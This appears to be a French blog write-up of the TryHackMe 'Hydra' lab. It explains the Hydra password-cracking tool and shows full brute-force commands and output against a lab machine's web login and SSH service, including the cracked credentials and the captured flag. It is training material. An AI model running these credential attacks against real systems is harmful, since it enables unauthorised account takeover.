---
layout: post
title: "TryHackMe — Hydra"
date: 2026-03-14
categories: [CTF, TryHackMe]
tags: [hydra, brute-force, ssh, http-post-form, wordlist, rockyou]
difficulty: easy
platform: tryhackme
excerpt: "Hydra est un outil puissant de craquage de mots de passe à distance, intégré par défaut dans Kali Linux, utilisé principalement pour des tests d'intrusion éthiques. Son but : tester automatiquement des milliers de combinaisons login/mot de passe jusqu'à trouver la bonne."
---

# C'est quoi Hydra ?

**Hydra** est un outil puissant de craquage de mots de passe à distance, intégré par défaut dans **Kali Linux**, utilisé principalement pour des tests d'intrusion éthiques. Son but : tester automatiquement des milliers de combinaisons login/mot de passe jusqu'à trouver la bonne.

- [Hydra sur Kali Linux](https://www.kalilinux.fr/commandes/hydra-sur-kali-linux/)
- [GitHub - vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

---

# Comment ça marche ?

Tu lui fournis :

1. **Une cible** (IP ou domaine)
2. **Un service** (SSH, FTP, HTTP, etc.)
3. **Une wordlist** de mots de passe (liste de mots à tester)
4. **Un utilisateur** (ou une liste d'utilisateurs)

Et il teste tout ça automatiquement à toute vitesse.

### Syntaxe de base

```bash
hydra -l <user> -P <wordlist> <ip> <service>
```

| Paramètre | Signification |
|-----------|---------------|
| `-l` | un seul username (ex: `-l admin`) |
| `-L` | liste d'usernames (ex: `-L users.txt`) |
| `-p` | un seul password |
| `-P` | liste de passwords (ex: `-P rockyou.txt`) |
| `-t` | nombre de threads (vitesse) |
| `-v` | mode verbose (voir ce qu'il teste) |

### Exemples concrets

**Brute force SSH :**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1
```

**Brute force FTP :**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.1
```

**Brute force formulaire web (POST) :**
```bash
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

Ici `^USER^` et `^PASS^` sont remplacés automatiquement par Hydra.

---

### La wordlist incontournable : `rockyou.txt`

C'est **la** wordlist de référence en CTF. Elle contient **14 millions** de mots de passe issus d'une vraie fuite de données.

Sur Kali Linux elle est déjà là :
```bash
/usr/share/wordlists/rockyou.txt
```

#### Checklist avant de lancer Hydra sur un formulaire web

**1. Trouver la bonne route**
- Faire un faux login et intercepter la requête avec **Burp Suite**
- Regarder la ligne `POST /??????` → c'est ta racine
- Exemple : `POST /login` → tu mets `/login:` dans ta commande

**2. Trouver le bon message d'échec**
- Faire un faux login et regarder ce que la page affiche
- Prendre un mot **unique et distinctif** de ce message
- Exemple : `"Your username or password is incorrect"` → tu mets `F=incorrect`

**3. Vérifier les noms des champs du formulaire**
- Dans Burp, regarder le **body de la requête POST**
- Exemple : `username=test&password=test` → les champs sont bien `username` et `password`

---

# Exploitation

| | |
|---|---|
| **Machine** | Hydra Challenge |
| **IP Cible** | 10.130.159.111 |
| **Difficulté** | Easy |
| **Plateforme** | TryHackMe |

---

### Flag 1 — Brute force Web (HTTP POST)

On se connecte au site `http://10.130.159.111` et on fait un faux test de connexion pour identifier le message d'erreur et adapter notre commande.

![Message d'erreur login]({{ '/assets/images/posts/ctf/tryhackme/hydra/1.png' | relative_url }})

On voit le message d'erreur `incorrect`. On applique maintenant notre commande Hydra :

```bash
> hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.130.159.111  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-23 05:16:39
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.130.159.111:80/login:username=^USER^&password=^PASS^:F=incorrect
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
.
.
.
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "carlos" - 44 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "jennifer" - 45 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "joshua" - 46 of 14344399 [child 6] (0/0)
[80][http-post-form] host: 10.130.159.111   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-23 05:16:51
```

On trouve le mot de passe qui est **sunshine**. On se connecte avec ces identifiants.

![Connexion réussie]({{ '/assets/images/posts/ctf/tryhackme/hydra/2.png' | relative_url }})

---

### Flag 2 — Brute force SSH

On lance Hydra sur le service SSH :

```bash
> hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.130.159.111 -V
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-23 05:53:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399)
[DATA] attacking ssh://10.130.159.111:22/
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
.
.
.
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "angel" - 34 of 14344401 [child 2] (0/0)
[ATTEMPT] target 10.130.159.111 - login "molly" - pass "jordan" - 35 of 14344401 [child 3] (0/0)
[22][ssh] host: 10.130.159.111   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-23 05:54:03
```

On retrouve le mot de passe **butterfly** et on se connecte en SSH :

```bash
> ssh molly@10.130.159.111
The authenticity of host '10.130.159.111 (10.130.159.111)' can't be established.
ED25519 key fingerprint is SHA256:otVPVpNsNBMnawP5TKP3RhQPuI4oSQneCeLHUsaliLc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.130.159.111' (ED25519) to the list of known hosts.
molly@10.130.159.111's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1083-aws x86_64)
.
.
> ls
flag2.txt
> cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
```

**Happy hacking !**
